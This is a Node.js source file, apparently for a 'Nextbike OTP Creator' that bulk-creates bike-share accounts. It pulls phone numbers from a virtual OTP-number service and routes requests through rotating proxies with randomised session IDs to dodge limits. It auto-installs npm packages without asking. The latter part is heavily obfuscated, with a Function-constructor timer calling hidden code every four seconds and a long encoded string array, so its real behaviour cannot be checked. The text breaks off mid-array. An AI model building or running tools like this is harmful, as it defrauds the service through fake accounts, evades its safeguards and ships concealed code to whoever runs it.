const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v1) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm"),
        v2 = {};
      v2.stdio = "inherit", v2.shell = true, execSync('\x22' + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", v2), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v3) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const https = require("https"),
  http = require("http"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk");
const readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent"),
  NEXA_KEY_FILE = path.join(__dirname, "nexa_key.txt");
class NexaRateLimiter {
  constructor(v4) {
    this.delayMs = v4, this.queue = [], this.processing = false;
  }
  ["enqueue"](v5) {
    return new Promise((v6, v7) => {
      {
        this.queue.push(async () => {
          try {
            v6(await v5());
          } catch (v8) {
            v7(v8);
          }
        });
        if (!this.processing) this._process();
      }
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v9 = this.queue.shift();
      await v9(), await new Promise(v10 => setTimeout(v10, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v11, v12, v13) {
  return new Promise((v14, v15) => {
    {
      const v16 = {};
      v16.range = v12, v16.format = "normal";
      const v17 = JSON.stringify(v16),
        v18 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v13 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v11,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v17)
          }
        },
        v19 = http.request(v18, v20 => {
          let v21 = '';
          v20.on("data", v22 => v21 += v22), v20.on("end", () => {
            try {
              {
                const v23 = JSON.parse(v21);
                v23.success && v23.number ? v14(v23.number.replace(/[^0-9]/g, '')) : v15(new Error(v23.error || "NexaOTP: No number returned"));
              }
            } catch (v24) {
              v15(new Error("NexaOTP: Invalid response"));
            }
          });
        });
      v19.on("error", v25 => v15(new Error("NexaOTP network: " + v25.message))), v19.setTimeout(10000, () => {
        v19.destroy(), v15(new Error("NexaOTP: Timeout"));
      }), v19.write(v17), v19.end();
    }
  });
}
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt";
let DEBUG_FILE = "debug.txt";
const B = chalk.hex("#00FF88"),
  C = chalk.hex("#00BFFF"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B");
let globalHwid = "Unregistered";
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(C("  _   _ _______   _______ ____ ___ _  _______ ")), console.log(C(" | \\ | | ____\\ \\ / /_   _| __ )_ _| |/ / ____|")), console.log(C(" |  \\| |  _|  \\ V /  | | |  _ \\| || ' /|  _|  ")), console.log(C(" | |\\  | |___  > <   | | | |_) | || . \\| |___ ")), console.log(C(" |_| \\_|_____|/_/ \\_\\|_| |____/___|_|\\_\\_____|")), console.log(C("                                              \n"));
  console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + C("Nextbike OTP Creator         ") + W('│')), console.log(W("│ [•] Developer : ") + C("NOT REXY                     ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium Build                ") + W('│')), console.log(W("│ [•] Version   : ") + C("NEXTBIKE-V2.0.2              ") + W('│')), globalHwid !== "Unregistered" && console.log(W("│ [•] HWID      : ") + Y(globalHwid.padEnd(27)) + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
function normalizePhoneNumber(v26) {
  let v27 = v26.replace(/\D/g, '');
  if (!v27.startsWith('+')) {
    v27 = '+' + v27;
  }
  return v27;
}
function parseProxy(v28) {
  if (!v28) return null;
  if (typeof v28 === "object") return v28;
  v28 = v28.trim();
  if (!v28) return null;
  let v29, v30, v31, v32;
  let v33 = "http";
  if (v28.startsWith("socks5://")) {
    v33 = "socks5", v28 = v28.slice(9);
  } else {
    if (v28.startsWith("socks4://")) {
      v33 = "socks4", v28 = v28.slice(9);
    } else {
      if (v28.startsWith("http://")) v33 = "http", v28 = v28.slice(7);else {
        if (v28.startsWith("https://")) {
          v33 = "http", v28 = v28.slice(8);
        }
      }
    }
  }
  if (v28.includes('@')) {
    const v35 = v28.split('@'),
      v36 = v35[0].split(':'),
      v37 = v35[1].split(':');
    v31 = v36[0], v32 = v36[1], v29 = v37[0], v30 = parseInt(v37[1]);
  } else {
    {
      const v38 = v28.split(':');
      if (v38.length === 2) {
        v29 = v38[0], v30 = parseInt(v38[1]);
      } else {
        if (v38.length === 4) {
          !isNaN(parseInt(v38[3])) && isNaN(parseInt(v38[1])) ? (v31 = v38[0], v32 = v38[1], v29 = v38[2], v30 = parseInt(v38[3])) : (v29 = v38[0], v30 = parseInt(v38[1]), v31 = v38[2], v32 = v38[3]);
        } else v38.length === 3 && (v29 = v38[0], v30 = parseInt(v38[1]), v31 = v38[2]);
      }
    }
  }
  if (!v29 || !v30) return null;
  const v34 = {};
  return v34.type = v33, v34.host = v29, v34.port = v30, v34.user = v31, v34.pass = v32, v34.original = v28, v34;
}
function rotateSessionId(v39) {
  if (!v39 || !v39.user) return v39;
  const v40 = {
      ...v39
    },
    v41 = v40;
  const v42 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  let v43 = false;
  for (const v44 of v42) {
    {
      if (v41.user && v44.test(v41.user)) {
        {
          const v45 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
          v41.user = v41.user.replace(v44, '' + v44.source.split('[')[0].replace(/\\/g, '') + v45), v43 = true;
          break;
        }
      }
    }
  }
  if (!v43 && v41.user) {
    {
      const v46 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      if (v41.user.includes("__cr.")) {
        v41.user = v41.user.replace("__cr.", "_session_" + v46 + "__cr.");
      } else v41.user = v41.user + "_session_" + v46;
    }
  }
  return v41;
}
(function () {
  const fn3 = function () {
      let v48;
      try {
        v48 = Function('return (function() {}.constructor("return this")( ));')();
      } catch (v49) {
        v48 = window;
      }
      return v48;
    },
    v47 = fn3();
  v47.setInterval(fn2, 4000);
})();
function fn1() {
  const v50 = ['ifn0CG', 'CIbozq', 'z1vRzG', 'uufosq', 'DMvMvW', 'B20Gta', 'BNbTlG', 'AwqGCa', 'yxrPBW', 'lIbdAa', 'DuPgDG', 'BevlrW', '4Psa4Psa4Psa4Psa', 'uNzmwq', 'DhjPBG', 'Aw5NlG', 't1btAG', 'AxbtEq', 'vM5xta', 'jgnWDq', 'ifnnuW', 'A1rdqq', 'tuT1CG', 'DxjPBG', 's2zYuG', 'ELnjzq', 'Aw5MBa', 'tfn1wq', 'AfDLsq', 'wgXNCq', 'vefXqq', 'tM9qCG', 'qwvpAG', 'A1LUzq', 'Cgvtza', 'suvnAq', 'sMXNzq', 'BMv3', 'CMvK', 'lsborq', 'wvzZDq', 'oLTHlq', 'uhHTvq', 'BwjLCG', 'Dfblrq', 'ienVBG', 'ttPCuW', 'BgvKia', 'DfLPqW', 'CdOGsq', 'vIaVia', 'yNfxCG', 'zfPOBW', 'mhWZFa', 'zw5K', 'C3qGCa', 'yMPLyW', 'BIbWAq', 'rKHwBG', 'AeT0vG', 'C1Ldva', 'yuTsza', 'vLLpAW', 'A3rHsG', 'Eu9Uuq', 'C3vJyW', 'rxHkAG', 'tgLJzq', 'u1btDW', 'qM1qEq', 't3Hhta', 'rMfPBa', 'yxnVyG', 'B2zNwq', 'tMLWrG', 'C2fRwG', 'zgvMyq', 'tKzlsW', 'rfDbuG', 'lvyYlG', 'u2LSzq', 'B2WGia', 'xYKGFa', 'uKXxBG', 'qMTNBW', 'DwD3uq', 'sK9prG', 'zxjUyq', 'C3nMDq', 'CZu6lW', 'AwvZrG', 'zxDvtq', 'zMfPBa', 'rM5nsG', 'uMziuW', 'AgLZiG', 'ievYCG', 'CfPVtG', 'CezQDG', 'nti4qG', 'ExrmDW', 'x3WGxW', 'rg9ysG', 'tujYqW', 'vhHdyq', 'ug9nEq', 'yxbWxW', 'uvviDG', 'FdH8oq', 'v2LUmW', 'uKD5tq', 's2DZuW', 'Aw1L', 'CvbUCa', 'BIaGia', 'txjpvW', 'zwDPCW', 'CMPjAG', 'zw4Gka', 'qvbjia', 'whHtBa', 'rvntxq', 'uvrPsq', 'EgPjza', 'B25Zzq', 'DvLuCW', 'y3rLza', 'AeffEa', 'utu0', 'CLjbDa', 'uMvZCa', 'vw5Yzq', 'zMf1Ba', 'DhntEq', 'uhjVEa', 'D3v0sa', 'sejIvG', 'zKn0Cq', 'EMLiCW', 'rMnxBa', 'ELPlsG', 'B3v0', 'x0fjmG', 'AgnQuG', 'zY50Ea', 'uNHNtW', 'D29YAW', 'v0vbCW', 'igvKzW', 'u3vJyW', 'Aw5nqW', 'r0rTuG', 'zLvPwq', 'zuPprW', 'vxL4sa', 'v21PvW', 'EKjWCW', 'tgfhtW', 'q0rirq', 'BMXVyq', 'oLWNjW', 'AhjLyq', 'uuzgAW', 't0WGia', 'zxnZpW', 'ntq2rq', 'C3rHCG', 'reDmqW', 'icaG4PYx', 'yxjNDG', 'ugnwta', 'yxzLza', 'vg5lza', 'yuLLrW', 'z2fVEq', 'DgXYwG', 'v29YAW', 'DuzrAq', 'BKP1wG', 'ueLSrq', 'ywnL', 'swTxAq', 's0voCW', 'icbFFa', 'BgWGlq', 'zs1pDq', 'u2jirq', 'u2LJAW', 'CvDbta', 'veLTCW', 'yMrhsW', 't2XiqW', 'zNHfDq', 'CNzPyW', 'DxP0yq', 'r1HXqW', 'rw50zq', 'CIbYyq', 'surLAa', 'wNfXBa', 'reXdEG', 's2LOAW', 'zcbozq', 'BhL1ta', 'rKX0ta', 'tvLvBG', 'DwnJzq', 't29YqW', 'C3rYAq', 'rKz6sa', 'qNDWqG', 'CMvKia', 'wfGPoG', 'zxDbtG', 'uNj4Ea', 'x2TLEq', 'tvrSBa', 'whrnzW', 's0zLCW', 'yw5nBW', 'svH0sa', 'yw5Jzq', 'v1bUvq', 'y3jHCa', 'rY1urq', 'BgP1Dq', 'C2HLBa', 'wwvZla', 'igzVCG', 'oIbozq', 'igzYBW', 'uMvTBW', 'lIbuyq', 'C3nOqW', 't1iGia', 'zxnZ', 'A3rTtG', 'l2fWAq', 'u3ftyG', 'DgjbBq', 'AxvqEq', 'AxPqEG', 'rwfODG', 'wfeTqG', 'uxjutW', 'zfbLva', 'C0jrBW', 'r01HzW', 'rvrkva', 'B0zvra', 'Ehj4CG', 'Dg9tDa', 'uwHzCW', 'ChDUAG', 'B3jbyW', 'zsbtzq', 'zxr1CG', 'vu1crq', 'sgfbuG', 'u2HHBW', 'yNrTqq', 'C1z1uq', 'sfrPtG', 'vMrKtW', 'CgLWzq', 'sKzJuq', 'yw5NDq', 'rwvOuq', 'y2zPuG', 'vKPLzW', 'icOOpW', 'DK1juW', 'wxbfuG', 'yvLnCq', 'z0vyDq', 'AxrPBG', 'zM9YBq', 'CfHSqq', 'y25LvG', 'tMHNtG', 'yKPosq', 'C2uGuW', 'AKTZsG', 'mZu5', 'CNrPBG', 'ELfAua', 'uejmyG', 'rhPWDW', 'sMn0za', 'xYaGpG', 'odqW', 'Aw5HBa', 'tNHTCW', 'zw5JBW', 'Bca2ia', 'shbgyG', 'wefYtW', 'rvHbia', 'Bs9HCa', 'ywXPza', 'z1PvDW', 'yM9Sza', 'serWBW', 'CKLKoW', 'qxmZBW', 'ntGX', 'E30UyW', 'tfjXvW', 'sNjJBG', 'tvLuyG', 'BMv4yq', 'vg90yq', 'icboBW', 'tMPJEq', 'q0rtqq', 'zY4Gmq', 'v0LeoG', 'Axnuva', 'zwvuCa', 'ieLUDG', 'BhvPvW', 'DNzmAW', 'zMLNDq', 'r0nnxW', 'vvritW', 'iokuGIa', 'BhLdBW', 'DfrPBq', 'B3iGza', 'lwfNzq', 'vf9trq', 'ndm3', 'zYbYzq', 'wuXbvq', 'D2vYqW', 'AujkBq', 'ChjVyW', 'uLH0uG', 'CMfUza', 'DxjJAa', 'mJe3rG', 'kcGOlG', 'tMv4yq', 'ywXS', 'mZaX', 'q01FuW', 'DwLwqq', 'B25Lia', 'yLnSEG', 'vwPfEa', 'Aw5PDa', 'qti1nG', 'DgvYlG', 'qK1zuG', 'C2HHmG', 'DNv1Bq', 'ndm1otmYnuXLDKjtuq', 'lI4U', 'icaGgW', 'cIaGia', 'ywrLza', 'vxfKrG', 'vJiXmW', 'zM5cDG', 'BMqGiG', 'mteXmq', 'k0zUnW', 'DxHTAW', 'CMzYzG', 'CgfKuW', 'Ew5LzG', 'A1LTtG', 'CLz5wa', 'B2nLCW', 's0uGva', 'De9jzq', 'Bwf4uG', 'r2r5yW', 'zLb4wa', 'DKrrrW', 't0vvEq', 'DezpBa', 'xsbezq', 'q1qGva', 'CYbRzq', 'q29UDa', 'mtaWia', 'vgfnAq', 'q2LTsq', 'tKrfuG', 'DcbJBW', 'uhvdyW', 'uejLAq', 't09ezG', 'ALjOBW', 'B3fXqW', 'tM8Sia', 'u0TjtG', 'AsboBW', 'q0rUsq', 'CwjOwG', 'Dgf0Dq', 'BxjyBq', 'DhjPBq', 'DMvSBW', 'AwDOCq', 'AgfYCW', 'B3rWCW', 'zxiG', 'BuT3rq', 'DhLSDq', 'vdu0', 'zw50Ba', 'CMvUza', 'CLn1Ca', 'ugDgEa', 'zw5JAq', 'CKfJDa', 'zs4k', 'icdILze', 'CxHnqW', 'BwTbzW', 'z2vzzW', 'tu9tEG', 'rgzwCW', 'khj1BG', 'ENHQAa', 'rcbiqq', 'AgvYia', 'A0LkwG', 'Aw5WDq', 't1njDa', 'EgHLuW', 'AKv6Cq', 'tgvSCG', '4PscifVIGki', 'rMznva', 'BsbWyq', 'DxbUEa', 'mZeX', 'wxncvW', 'uKLArq', 'seeZoa', 'B0T5Cq', 'ihjHEG', 'yNLwyG', 'Aw9vsq', 'yuLgua', 'tvvTuq', 'rKnzDW', 'sMHHyq', 'ChjVCa', 'B3H5lq', 'y2HHAq', 'AKn2uW', 'B1fnCq', 'A2v5CW', 'rKfjta', 'svnswq', 'DKf0ta', 'v1DZEa', 'tvzlrG', 'y2zeqG', 'zwzHDq', 'CMDTqq', 'zvn5BG', 'C3rHBG', 'yLLktW', 'vNDmvG', 'BNDQBa', 'zhbVAq', 'z1fbta', 'A1LprW', 'AgLpAW', 'mti3rG', 'CKvqyq', 'wgDRBW', 'ELLQsq', 'mJaGva', 'tLLftq', 'qw5fuG', 'z2uOCW', 'y3vjDG', 'B25Lxq', 'BwjktW', 'mtiXmG', 'sLLRuW', 'vw5TEG', 'ifTKzq', 'DgLVBG', 't3njDa', 'qxvkBa', 'tMXUEa', 'sffYCW', 'ANn1zW', 'AYbMyq', 'BufVyW', 'zxnZzq', 'DfDWsq', 'vMXfAq', 'sxDftq', 'EurUEG', 'uLbIBG', 'xsdINiuG', 'Eg5OyW', 'zxqTsq', 'D0PLCa', 'ExHrEq', 'yvPWsG', 'BNrPBG', 'A0Lnva', 'vvzXBW', 'sfruua', 'CgvYia', 'x19FxW', 'zhmGka', 'yMPUsG', '4Pwq4Pwq4Pwq4PwJ', 'BMTtEq', 'DwXSEq', 'B2L1Aa', 'x19JCG', 'CM9Tia', 'wwvZ', 'quvtxW', 'q3HzAG', 'y29UBG', 'mJiXma', 'C3rHDa', 'uwjczG', 'B3v1DW', 'veXtDG', 'mY9Nzq', 'vxHIBW', 'C3DVsG', 'DgvZ', 'r09Ssq', 'kcKG', 'tKuYmG', 'u1Plvq', 'DgL2zq', 's0vzlq', 'BgzNzq', 'CLjQuG', 'u0PHza', 'DgvYia', 'shfTwa', 'u3LUyW', 'u1vdqW', 'y29UCW', 'uhjV', 'BfPbAa', 'r2zZqG', 'mtyYna', 'qLrRrW', 't19tuW', 'rgrUtW', 'uKLiAW', 'CuzczG', 'CM4Gka', 'qLrxuG', 'yvbLBq', 'yMvYia', 'wLnYCW', 'D3PotG', 'zwn0zq', 'rMLSzq', 'CKjPwq', 'wgHgBa', 'AxnbCG', 'zuP2wG', 'BNnMCq', 'mc4YFa', 'AM9PBG', 'mte3va', 'qxrjsW', 'yw1L', 'DdOGBG', 'tfrdrG', 'BhznAa', 'zgvSyq', 'Esbszq', 'ihvZzq', 'zxrJAa', 'AMnizG', 'AfD1AG', 'rvrYBG', 'CePHvq', 'ieLelG', 'A2v5ia', 'BMvSia', 'u3LNvW', 'lunPBq', 'zxn0', 'uLHRuW', 'zKTUyW', 'z3zcwa', 'qKPzuG', 'zgLUzW', 'zeLZtq', 'zs5Uzq', 'y1PVqG', 'zsbPBG', 'rs1jra', 'Bsbozq', 'uhfsBG', 'CM95', 'qvnvuW', 'igLUDa', 'wK5Mra', 'DxbKyq', 'ignVBG', 'BgznuG', 'u2D6uq', 'lIbqBa', 'oI8V', 'CZOG', 'EwHjDq', 'A2Lyza', 'ifbvqG', 'wefHCG', 'rxbQtq', 'CfnbvG', 'icaGia', 'ntq2qG', 'ANnpvq', 'wvrAtG', 'y3qGDa', 'D2fYzq', 'rMLSDa', 'wfz6CW', 'zxf1Aq', 'l3zLCG', 'y3LHBG', 'BNjqCa', 'yxnOpq', 'icdINjmG', 'C3rKAq', 'vuP5yq', 'BM93', 'Dw1WyW', 'sLj0wG', 'sefxuq', 'twThCa', 'ifvWza', 'BvjSzW', 'yKLlrq', 'rMPKwq', 'wKPQBa', 'AvjYCa', 'ne5tta', 'vgXTtq', 'wwfcCG', 'DhvYzq', 'mxW1Fa', 'DuLRsa', 'zeDpsG', 'su4Gua', 'yKjJvq', 'yxHlzG', 'zvLWAW', 'zxPbDW', 'z0rcta', 'EvzRtW', 'uNbvwG', 'wwL4tG', 'txHSva', 'vK11EG', 'DxrtDa', 'zxbLBG', 'su5sCW', 'DxnzAG', '4Pwq4Pwq4Pwq4PwD', 'uxjpDq', 'icdILAdILza', 'zNjPyG', 'Ee1IzG', 'DsbTDq', 'vvHMwG', 'uwXpqG', 'rxzHvW', 'tKrF', 'wvHLAW', 'zw50lq', 'tffizW', 'AxD5Bq', 'BgH4zG', 'wujtyW', 'sMnzvW', 'Bwf4', 'AxjLza', 'ntaGva', 'rwXbsG', 'zsaODa', 'suroqq', 'zu9IAG', 'tgvUzW', 'nZa2', 'AhKNia', 'lJeVCG', 'zw50ia', 'ie5fwa', 'oI8VBG', 'DwX0oG', 'zLbRzW', 'CMvHza', 'yufYEq', 'xYaGia', 'yxrL', 'oIb0lG', 'uKPLAW', 'mtm3lG', 'mZyZ', 'idqWmW', 'ExvODW', 'ig9Uia', 'BMDPzG', 'sur2sa', 'AMrhza', 'D3rNrq', 'C2HPzG', 'idePlG', 'yvnJta', 'CMvWBa', 'ufzlEa', 'uwXTCa', 'AYa9ia', 'rvDPvq', 'ihXFFa', 'tNDSwa', 'AhjTyq', 'Ee1tDW', 'wNj3rq', 'z3jHCa', 'AMzZAW', 'C2fTCW', 'C3rHBa', 'rgvMyq', 'CZOVlW', 'rufwyW', 'qMHMBW', 'zePvsa', 'ucblzq', 'Cg9YDa', 'zgf0yq', 'r0vu', 'BMnVza', 'oLaTmW', 'AejVDq', 'mJa3', 'tfnFqq', 'wM9QBa', 'yxrLuW', 'rxjYBW', 'tgLTAq', 'sffxvW', 'y2DeCW', 'wvfova', 'r0v5yq', 't2XpsW', 'iokUNIbB', 'ufbtzW', 'A1nnEa', 'zujVyq', 'CNzYuW', 'DMvYia', 'q3HkrW', 'DgvTua', 'EMTbBq', 'ihbYBW', 'm1bdnW', 'AwDNzq', 'x0KWma', 'Bca2yq', 'veLVCG', 'pxPlzq', 'sNzPDa', 'Cunfta', 'BMqGAq', 'EKeTwG', 'quniqq', 'ihrOAq', 'rgG3sG', 'AxvTia', 'ihWGsa', 'AwXLza', 'Bhq6ia', 'wgPKvq', 'thvHEG', 'x198xW', 'ieXPyW', 'wMfnrW', 'cIaG4PYx', 's2novW', 'y1LhuW', 'rfjmqq', 'igzPBa', 'wNrbDW', 'mtiZrW', 'vezizW', 'vMzezq', 'whvSqq', 'zLK9cG', 'yKX3rq', 'sgz5Aa', 'v0vjuW', 'CYa1rW', 'zgvIDq', 'u29UEq', 'z2v0', 'q09hvq', 'vLHKrq', 'qtiWlq', 'yw5VDa', 'sM1VuG', 'tKDNBa', 'D2HPDa', 'A0DrrG', 'yuPRAW', 'tfv0yG', 'zwq6ia', 'sfjfqq', 'wxfNDa', 'lI4Ukq', 'thHUyq', 'wgnrBq', 'u1rfuG', 'Dfjkwa', 'vwzeAq', 'tJbzBq', 'AKvbtG', 'Ehr4Da', 'BvvwDW', 'Aurxva', 'mJiWmW', 'u00TrW', 'B3qGyW', 'zLPtAq', 'u0PWta', 'CxvLDq', 'AKDPsW', 'zxiGjW', 'v1PszW', 't19uta', 'zsbqyq', 'wZeVmq', 'C09uAq', 'ww5Wwq', 'ksKUlG', 'luvdra', 'wLHNEa', 'igLUCW', 'ihT9', 'ywDLBG', 'BMfTzq', 'yuv4yq', 'EKjXEG', 'mJeWnW', 'zwqGza', 'vJiXma', 'uvLnCG', 'uwn3CW', 'rLLuvW', 'zLPmtW', 'vxPIvW', 'u00Tqq', 'y2vUCW', 'zsbUBW', 'qu1ADa', 'x0jHCW', 'DeHXtq', 'ywjPCq', 'DfPwuq', 'q2X3yW', 'tNPoAq', 'CNvLkq', 'BMTNza', 'zwn0kq', 'y0DyDa', 'sK9WyW', 'yxbPmG', 'y0nRzG', 'DgHYzq', 'CNvJDa', 'B3HyAa', '4PYxievY', 'ifrPBq', 'vuHkzq', 'ota2qG', 'Aw4GBa', 'ntm2qG', 'q1juAq', 'uen4uW', 'CxzdBq', 'ihXFxW', 'iefIBW', 'qufZDW', 'qLPeDq', 'q0rkwq', 'sfzSra', 'u19dsa', 'tNLjBG', 'wL8Kxq', 'ChqTyW', 'BKXvvG', 'Bfbeta', 'B2DPyW', 'tLHSEa', 'AMPeAW', 'zgToCG', 'zKntrW', 'CMf5', 'C2v0sq', 'u0TMAa', 'uNPPyG', 'DcbJAa', 'ywrZia', 's2vNtW', 'ls0Tlq', 'mtmXnW', 'tMjnsW', 'ndCY', 'BMrgAq', 'CMvXDq', 'ywqGzG', 'r2fUsq', 'ls0ktq', 'q3fWua', 'mtiXqW', 'u1Lstq', 'rKzg', 'jg1Nia', 'ihjHBG', 'xYrDwW', 'q0fOyW', 'mJeWoq', 'BxbLCG', 'DMuGCW', 'Ae5ywa', 'zxnZBW', 'uIbttW', 'ue9mwq', 'qNHzwq', 'q1Pswa', 'tfvtia', 'r1HIDG', 'ihrVia', 'wLLYEG', 't1rqxq', 'vgLTzq', 'qYblrq', 'AK11Aa', 'DgfJDa', 'EwvZ', 'teDpAa', 'vwjzBq', 'BKfqBG', 'Dg9mBW', 'CMv0CG', 'C2f6ta', 'CM9YoG', 'CMvHBq', 'u0fPzW', 't253rq', 'vM9SDq', 'zxjSEq', 'DMuGyG', 'Dg5QAq', 'Cgf1CW', 'vvzktW', 'EMXPyG', 'u2vUDa', 'ugLOrG', 'vvLcyG', 'wgjXqG', 'qwjVCG', 'lYbCxW', 'v21sEq', 'uxvOBW', 'wgHbEG', 'CgfKrq', 'mtCZ', 'A0Pgua', 'rcaGia', 'z2DLCG', 'y0TizG', 'Bu51sa', 'ExbPzq', 'BNbT', 'AYWKBq', 'y2fSzq', 'y29UDa', 'x1nftG', 'zNvUyW', 'Cgf0uG', 'zhm6', 'r1HeDW', 'C2v0va', 'CgXHDa', 'ic1fCG', 'icdILzRILza', 'EennAa', 'y3H4sW', 'yvPPzG', 'sKDgCq', 'Be51Bq', 'BeTnBq', 'DxrO', 'zguGyq', 'C3rVBq', 'B0j2yW', 'yxbWBa', 'EuzJwa', 'tw9Vva', 'z1btBG', 'psaOrW', 'zwqGCW', 'BgXPBG', 'Es1HzW', 'vezMuq', 'uvr3ua', 'u00TrG', 'DNDzwa', 'nti2qG', 'mM0G', 'z3nbDq', 'se9Xuq', 'ucbqyq', 'y3HgAW', 'yxr1CW', 'wujNsW', 'BMvhDq', 'ihrYEq', 'lxPblq', 'ifrVAW', 'Dgz5CG', 'zxiGka', 'vurRuG', 'sK1OuW', 'mZa0odi2nfnyuwjLwq', 'kYKRkq', 'B1rgDW', 'A0zhzq', 'icbqCG', 'zw1PDa', 'luffuW', 'uwriyW', 'yvDJBW', 'tgDfBq', 'CMvZCW', 'lti1nG', 'DgvY', 'sMjsBq', 'mtmYma', 'wvDmAG', 'x18GxW', 'zw5XDq', 'A21bwq', 'Dg9Y', 'rhPNvq', 'y3b1la', 'rLrTDG', 'ywjICq', 'vhrsBa', 'zxqTqW', 'r1zVDa', 'BKjYAq', 'vNm3nq', 'zMPnsG', 'uwPJua', 'qK5REa', 'C3rVCa', 'Bg9N', 'EunVBG', 'zw5KCW', 'B3jPzW', 'yLjgwG', 'tM8GAa', 'tfjIra', 'mdaPoG', 'ww9TAG', 'CNnPBW', 'icD8jW', 'uhP1Da', 'ywnKzW', 'zKPevG', 'Cg93zq', 'jgrPCW', 'mJiWoa', 'tNHQEq', 'zxHPCW', 'nhWY', 'lvjtqq', 'BIbMyq', 'BM9YBq', 'EKPAsa', 'CY9fBq', 'rfrxvW', 't3Dtwq', 'zKrnDa', 't1bFtG', 'A2vKkq', 'BgLKia', 'CKPMDa', 'Aw51zq', 'DMrgvW', 'suvnyW', 'BgvtEq', 'Dw5SAq', 'vwvTtG', 'y3qTtW', 'rgvWzq', 'Dw5KoG', 'yxrLCG', 'DgLUzW', 'CIbUzq', 'u3yXxW', 'sMrfwq', 'v2LgAG', 'u01tia', 'BgvUzW', 'wKruDa', 'u2f2zq', 'qtyWmq', 'mJmWna', 'Ewzvuq', 'AvbUAq', 'zMfSCW', 'CYbSBW', 'z0zkDW', 'DgDVDq', 'uM1Ysa', 'EvjvqW', 'tvqYmq', 's2XzAq', 'zsboBW', 'AvvjEq', 'CMLHBa', 'wKTfqW', 'sufUtG', 'u21ruq', 'r0veAG', 'EgLqBa', 'CI4Grq', 'r2LAva', 'pvWNqW', 'uY1otW', 'uNzOCq', 'icGVzW', 'xsbwzq', 'v2HuuW', 'C1LTDG', 'z1HAqq', 'igrPCG', 'BNrSEq', 'y29UyW', 'zeDLDW', 'z3fdvG', 'DMvYAq', 'qvrZqq', 'Axr5ia', 'sxfuvq', 'DuzRqW', 'qLbdAG', 'cIaGwW', 'sxrTDG', 'zxiGmG', 'y0PbAa', 'vePzDq', 'Bu9gEq', 'zgvMBa', 'Eg1ruq', 'y1LvzW', 'AwvWqG', 'yufvCG', 'uKvzDW', 'CgvUza', 'y3PHBW', 'Aw5N', 'zxj2zq', 'v05zBG', 'zxHWAq', 'mtK6ua', 's2v5Ca', 'yMfUBG', 'Ag9ZDa', 's2TRCa', 'BxzKBq', 'u2nYyq', 'CMLUzW', 'DgLTzq', 'zgv0zq', 'ELLpsW', 'vJiYmW', 'igzVDq', 'vJiZmq', 'x3bYBW', 'DhDVCG', 'zgzkBa', 'C0zmsW', 'qxHrtG', 'g1SZsG', 'zuf4ta', 'AurduG', 'C291CG', 'CYbgAq', 'AwPYEG', 't0Xzmq', 'EhPfqW', 'u2jMBG', 'vgDStG', 'BgvUDa', 'ruLjwa', 'y0LsBG', 'Egjdyq', 'whrovG', 'q0PNyW', 'tw5srW', 'zKvfwG', 'ucbbua', 'rvP5sq', 'BgqGBG', 'qxn1CW', 'tfHJta', 'iezPCG', 'CIbMDq', 'zcaGia', 'mJmWmq', 'wZmZBq', 'Cejkva', 'reHXCG', 'B2yGDa', 'qvfzwG', 'DxfQwG', 'CKXUBq', 'mtm1rG', 'vhbtwG', 'zu9YuG', 'CgfZCW', 'ALfyzG', 'ibTBoq', 'swX6Ea', 'BLf0va', 'B0LLDG', 'swPwsW', 't25yCa', 'uKjwuq', 'EwfWyG', 'DMfSDq', 'ChqTBa', 'uwvftG', 'DMfS', 'zMLSzq', 'BMvS', 'CKvPsa', 'if98ia', 'EeTPna', 'u2vSzq', 'AxHHra', '4Psa4Psa4Psa4Psq', 'BYbPBG', 'zNnSEa', 'rM9psW', 'mte2ua', 'tgrwtq', 'qunYDW', 'rvPnvW', 'zxzItG', 'CNr5ia', 'rxjYoG', 'q293qG', 'C29Yia', 'yxvmDa', 'idWGia', 'CMvZBW', 'y291BG', 'CwPXBG', 'CM9Syq', 'B3DZlG', 'BwnjDW', 'icGVCa', 'zw5Kia', 'Exb0BW', 'rfbNwq', 'BvrzsW', 'vJiYnW', 'FfnftG', 'z3PPCa', 'Cu9RvG', 'vhLAua', 'rviG4Ocu', 'z1zZuW', 'u0vsvG', 'AwvZlG', 't1rqoG', 'icPCkq', 'zw4TrW', 'ms4Y', 'y3j5Ca', 'DhvZia', 'wu9Hsq', 'vu5msG', 'DNP2rq', 's2jNCq', 'ihWGFa', 'DgjKCq', 'vwDluq', 'wu5Wva', 'DhvAvW', 'DerYuq', 'y2vZCW', 'vvL3sa', 'BhzL', 'CIbqCG', 'C2vHCG', 'mLz3qq', 'B2DXta', 'sNHYBa', 'yMHXuG', 'DhH0', 'zsKUtq', 'ywHgCa', 